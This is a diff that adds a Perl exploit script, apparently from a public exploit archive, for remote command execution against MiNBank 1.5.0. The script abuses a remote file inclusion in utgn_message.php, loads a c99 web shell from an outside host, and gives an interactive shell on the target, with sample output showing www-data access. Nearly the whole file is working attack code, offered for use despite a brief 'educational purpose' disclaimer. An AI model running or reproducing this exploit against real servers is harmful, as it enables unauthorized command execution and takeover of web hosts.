@@ -1,0 +1,99 @@
+#!/usr/bin/perl
+####################################################################
+# MiNBank 1.5.0 Remote Command Execution Exploit
+# download: http://downloads.sourceforge.net/minbank/
+#
+# Author: Jose Luis Gongora Fernandez 'aka' JosS
+# mail: sys-project[at]hotmail[dot]com
+# site: http://www.hack0wn.com/
+# team: Spanish Hackers Team - [SHT]
+#
+# Hack0wn Security Project!!
+#
+# This was written for educational purpose. Use it at your own risk.
+# Author will be not responsible for any damage.
+#
+####################################################################
+#
+# "need" allow_url_include = On && register_globals = On
+#
+#  Attack vector_RFI!: [/minba/utility/utgn_message.php]
+#     ...
+#      require_once("$minsoft_path/utility/utgn_config.php");
+#     ...
+#
+####################################################################
+# OUTPUT: (tested on localhost)
+#
+# [shell]:~$ id
+#  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# [shell]:~$ uname -a
+#  Linux h4x0rz 2.6.18-6-686 #1 SMP Fri Dec 12 16:48:28 UTC 2008 i686 GNU/Linux
+# [shell]:~$ exit
+# h4x0rz:/home/joss/Desktop#
+
+
+use LWP::UserAgent;
+use HTTP::Request;
+use LWP::Simple;
+use Getopt::Long;
+
+sub clear{
+system(($^O eq 'MSWin32') ? 'cls' : 'clear');
+}
+
+&clear();
+
+sub banner {
+        &clear();
+	print "[x] MiNBank 1.5.0 Remote Command Execution Exploit\n";
+	print "[x] Written By JosS\n";
+	print "[x] sys-project[at]hotmail[dot]com\n\n";
+	print "[+] Usage:\n";
+	print "[+]     $0 -vuln \"web+path\" -shell \"shell\"\n";
+	print "[+] eX: $0 -vuln \"http://www.hack0wn.com/test/\" -shell \"http://hack0wn.com/desc/c99.txt?\"\n\n";
+        exit();
+}
+
+my $options = GetOptions (
+  'help!'            => \$help, 
+  'vuln=s'            => \$vuln, 
+  'shell=s'            => \$shell
+  );
+
+&banner unless ($vuln);
+&banner unless ($shell);
+
+&banner if $banner eq 1;
+
+chomp($vuln);
+chomp($shell);
+
+while (){
+
+	print "[shell]:~\$ ";
+	chomp($cmd=<STDIN>);
+
+	if ($cmd eq "exit" || $cmd eq "quit") {
+		exit 0;
+	}
+
+	my $ua = LWP::UserAgent->new;
+        $iny="?&act=cmd&cmd=" . $cmd . "&d=/&submit=1&cmd_txt=1";
+        chomp($iny);
+        my $own = $vuln . "/minba/utility/utgn_message.php?minsoft_path=" . $shell . $iny;
+        chomp($own);
+	my $req = HTTP::Request->new(GET => $own);
+	my $res = $ua->request($req);
+	my $con = $res->content;
+	if ($res->is_success){
+		print $1,"\n" if ( $con =~ m/readonly> (.*?)\<\/textarea>/mosix);
+	}
+           else
+             {
+                print "[p0c] Exploit failed\n";
+                exit(1);
+             }
+}
+
+# __h0__
